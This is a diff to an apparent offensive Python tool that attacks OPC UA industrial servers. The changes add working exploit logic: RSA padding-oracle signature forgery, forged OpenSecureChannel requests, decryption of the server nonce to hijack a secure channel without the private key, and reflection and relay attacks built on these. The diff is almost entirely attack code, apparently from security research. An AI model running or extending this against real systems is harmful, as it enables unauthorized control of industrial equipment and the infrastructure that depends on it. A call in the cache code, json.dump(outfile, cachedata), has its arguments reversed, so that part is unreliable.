@@ -14,8 +14,9 @@ from enum import Enum, auto
 from binascii import hexlify, unhexlify
 from base64 import b64encode, b64decode
 from datetime import datetime, timedelta
+from pathlib import Path
 
-import sys, os, itertools, re, math, hashlib
+import sys, os, itertools, re, math, hashlib, json
 
 # Logging and errors.
 def log(msg : str):
@@ -419,7 +420,7 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : S
   log('Finished browsing.') 
 
 # Reflection attack: log in to a server with its own identity.
-def reflect_attack(url : str, demo : bool):
+def reflect_attack(url : str, demo : bool, try_opn_oracle : bool, try_password_oracle : bool, cache_file : Path):
   proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
   endpoints = get_endpoints(url)
@@ -437,8 +438,32 @@ def reflect_attack(url : str, demo : bool):
     log_success(f'Attack succesfull! Authenticated session set up with {url}.')
     if demo:
       demonstrate_access(url, token, target.securityPolicyUri)
+  elif try_opn_oracle or try_password_oracle:
+    tcp_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.securityPolicyUri != SecurityPolicy.AES256_SHA256_RSAPSS and ep.transportProfileUri.endswith('uatcp-uasc-uabinary')]
+    if tcp_eps:
+      target = tcp_eps[0]
+      tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
+      assert tproto == TransportProtocol.TCP_BINARY
+      
+      log(f'No HTTPS endpoints. Trying to bypass secure channel on {target.endpointUrl} via padding oracle.')
+      with bypass_opn(target, target, try_opn_oracle, try_password_oracle, cache_file) as chan:
+        log(f'Trying reflection attack (if channel is still alive).')
+        try:
+          token = execute_relay_attack(chan, target, chan, target)
+        except ServerError as err:
+          if err.errorcode == 0x80870000:
+            raise AttackNotPossible('Server returning BadSecureChannelTokenUnknown error. Probably means that the channel expired during the time needed for the padding oracle attack.')
+          else:
+            raise err
+        
+        log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
+        if demo:
+          demonstrate_access(chan, token, target.securityPolicyUri)      
+    else:
+      raise AttackNotPossible('No endpoints applicable (TCP/HTTPS transport and a non-None security policy are required; also, support for Aes256_Sha256_RsaPss is currently not implemented yet).')
+    
   else:
-    raise AttackNotPossible('TODO: implement combination with OPN attack.')
+    raise AttackNotPossible('Server does not support HTTPS endpoint. Try with --bypass-opn instead.')
       
 def relay_attack(source_url : str, target_url : str, demo : bool):
   log(f'Attempting relay from {source_url} to {target_url}')
@@ -478,7 +503,7 @@ def relay_attack(source_url : str, target_url : str, demo : bool):
           demonstrate_access(mainchan, token, tep.securityPolicyUri)
         return
     
-    raise AttackNotPossible('TODO: implement combination with OPN attack.')
+    raise AttackNotPossible('TODO: implement --bypass-opn for relay attack.')
   except ServerError as err:
     if err.errorcode == 0x80550000 and target_url.startswith('opc.tcp'):
       raise AttackNotPossible('Security policy rejected by server. Perhaps user authentication over NONE channel is blocked.')
@@ -881,9 +906,13 @@ def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password :
   log_success(f'Success! Raw result: {hexlify(result).decode()}')
   
   # Check how plaintext is padded and display unpadded version.
-  if result.startswith(b'\x00\x02') and b'\x00' not in result[2:9] and b'\x00' in result[10:]:
-    log(f'Plaintext uses PKCS#1v1.5 padding. Unpadded value:')
-    unpadded = result[(result[10:].find(b'\x00') + 11):]
+  unpadded = None
+  if result.startswith(b'\x00\x02'):
+    try:
+      unpadded = remove_rsa_padding(result, SecurityPolicy.BASIC128RSA15)
+      log(f'Plaintext appears to use PKCS#1v1.5 padding. Unpadded value:')
+    except:
+      pass
   else:
     unpadded = decode_oaep_padding(result, 'sha1')
     if unpadded is not None:
@@ -922,24 +951,16 @@ def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password :
         return
       except:
         pass
-  
-def int2bytes(value : int, outlen : int) -> bytes:
-  # Coverts a nonnegative integer to a fixed-size big-endian binary representation.
-  result = [0] * outlen
-  j = value
-  for ix in reversed(range(0, outlen)):
-    result[ix] = j % 256
-    j //= 256
-    
-  if j != 0:
-    raise ValueError(f'{value} does not fit in {outlen} bytes.') 
-  return bytes(result)
 
-
-def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, hasher : str) -> bytes:
+def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, policy : SecurityPolicy) -> bytes:
   # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
   # Logs and returns signature.
   
+  assert policy != SecurityPolicy.NONE
+  if policy == SecurityPolicy.AES256_SHA256_RSAPSS:
+    raise AttackNotPossible('Spoofing PSS signature is possible but currently not yet implemented.')
+  
+  hasher = 'sha1' if policy == SecurityPolicy.BASIC128RSA15 else 'sha256'
   oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
   
   # Compute padded hash to be used as 'ciphertext'.
@@ -1037,11 +1058,9 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
     demonstrate_access(*chantoken, ep.securityPolicyUri)
     
 
-def forge_opn_request(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> OpenSecureChannelMessage:
-  # Use the padding oracle attack to forge a (reusable) signed and encrypted OPN request.
-  sp = endpoint.securityPolicyUri
-  pk = certificate_publickey(endpoint.serverCertificate)
-  assert sp != SecurityPolicy.NONE
+def forge_opn_request(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> OpenSecureChannelMessage:
+  # Use the padding oracle attack (against impersonate_endpoint) to forge a reusable signed and encrypted OPN request, that can be used against login_endpoint.  
+  assert login_endpoint.securityPolicyUri != SecurityPolicy.NONE
   
   plaintext = encodedConversation.to_bytes(encodedConversation.create(
     sequenceNumber=1,
@@ -1050,36 +1069,88 @@ def forge_opn_request(endpoint : endpointDescription.Type, opn_oracle : bool, pa
       requestHeader=simple_requestheader(),
       clientProtocolVersion=0,
       requestType=SecurityTokenRequestType.ISSUE,
-      securityMode=endpoint.securityMode,
+      securityMode=login_endpoint.securityMode,
       clientNonce=SPOOFED_OPN_NONCE,
-      requestedLifetime=3600000,
+      requestedLifetime=3600000, # 1000 hours
     ))
   ))
   msg = OpenSecureChannelMessage(
     secureChannelId=0,
-    securityPolicyUri=sp,
-    senderCertificate=client_certificate,
-    receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
+    securityPolicyUri=login_endpoint.securityPolicyUri,
+    senderCertificate=impersonate_endpoint.serverCertificate,
+    receiverCertificateThumbprint=certificate_thumbprint(login_endpoint.serverCertificate),
     encodedPart=plaintext
   )
-  raise Exception('TODO: fix padding')
-  padded_msg = pkcs7_pad(msg.to_bytes(), rsa_plainblocksize(sp, pk))
   
-  log('First, trying sigforge attack to produce OPN signature.')
-  hasher = 'sha1' if sp in [SecurityPolicy.BASIC128RSA15, SecurityPolicy.BASIC256] else 'sha256'
-  forge_signature_attack(endpoint.endpointUrl, padded_msg, opn_oracle, password_oracle, hasher)
+  log('Trying sigforge attack to produce OPN signature.')
+  imp_pk = certificate_publickey(impersonate_endpoint.serverCertificate)
+  login_pk = certificate_publickey(login_endpoint.serverCertificate)
+  login_sp = login_endpoint.securityPolicyUri
+  msg.sign_and_encrypt(
+    signer=lambda data: forge_signature_attack(impersonate_endpoint.endpointUrl, data, opn_oracle, password_oracle, login_sp),
+    encrypter=lambda ptext: rsa_ecb_encrypt(login_sp, login_pk, ptext),
+    plainblocksize=rsa_plainblocksize(login_sp, login_pk),
+    cipherblocksize=login_pk.size_in_bytes(),
+    sigsize=imp_pk.size_in_bytes(),
+  )
   
-  msg.encodedPart = b''
-  ciphertext = rsa_ecb_encrypt(sp, pk, padded_msg[len(msg.to_bytes()):] + signature)
-  msg.encodedPart = ciphertext
   log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
-  
   return msg
   
-# def bypass_opn(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> ChannelState:
-#   # Attempts to set up a security channel without knowing the private key, by exploiting a padding oracle twice.
-#   .....
-
+def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool, cache : Path) -> ChannelState:
+  lproto, lhost, lport = parse_endpoint_url(login_endpoint.endpointUrl)
+  if lproto != TransportProtocol.TCP_BINARY:
+    raise AttackNotPossible('Target endpoint should use opc.tcp protocol.')
+  
+  # Attempts to set up a secure channel without knowing the private key, by exploiting a padding oracle twice.
+  cachedata = {}
+  if cache.exists():
+    try:
+      with cache.open('r') as infile:
+        cachedata = json.load(infile)
+    except:
+      log(f'Error parsing {cache} contents. Ignoring it and starting a new cache file.')
+      
+  # An OPN can be reused as long as the endpoints use the same certificates and security policies.
+  ep_id = lambda ep: f'{hexlify(certificate_thumbprint(ep.serverCertificate))}-{ep.securityPolicyUri.name}'
+  cachekey = f'{ep_id(impersonate_endpoint)}/{ep_id(login_endpoint)}'
+  if cachekey in cachedata:
+    log('Using signed+encrypted OPN request from cache.')
+    opn_req = OpenSecureChannelMessage()
+    opn_req.from_bytes(b64decode(cachedata[cachekey]))
+  else:
+    opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle)
+    log(f'Storing signed+encrypted OPN request in cache file {cache}.')
+    cachedata[cachekey] = b64encode(opn_req.to_bytes())
+    with cache.open('w') as outfile:
+      json.dump(outfile, cachedata)
+  
+  log('Performing the OPN handshake...')
+  login_sock = connect_and_hello(lhost, lport)
+  opn_reply = opc_exchange(login_sock, opn_req)
+  
+  log_success('Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.')
+  oracle, oracle_ep = find_padding_oracle(impersonate_endpoint.endpointUrl, opn_oracle, password_oracle)
+  cipherblocksize = certificate_publickey(oracle_ep.serverCertificate).size_in_bytes()
+  assert len(opn_reply.encodedPart) % cipherblocksize == 0
+  
+  decrypted = rsa_decryptor(oracle, oracle_ep.serverCertificate, opn_reply.encodedPart[:cipherblocksize])
+  log_success(f'Success! Got the following plaintext: {decrypted}')
+  unpadded = remove_rsa_padding(decrypted, login_endpoint.securityPolicyUri)
+  
+  # Assuming response fits in single plaintext block.
+  log('Removed padding. Now parsing OpenSecureChannelResponse.')
+  opn_resp, _ = openSecureChannelResponse.from_bytes(encodedConversation.from_bytes(unpadded)[0])
+  log_success(f'Extracted secret server nonce: {hexlify(opn_resp.serverNonce).decode()}')
+  
+  return ChannelState(
+    sock=login_sock,
+    channel_id=opn_resp.securityToken.channelId,
+    token_id=opn_resp.securityToken.tokenId,
+    msg_counter=2,
+    securityMode=login_endpoint.securityMode,
+    crypto=deriveKeyMaterial(login_endpoint.securityPolicyUri, SPOOFED_OPN_NONCE, opn_resp.serverNonce),
+  )
     
 
 def oracletest():  
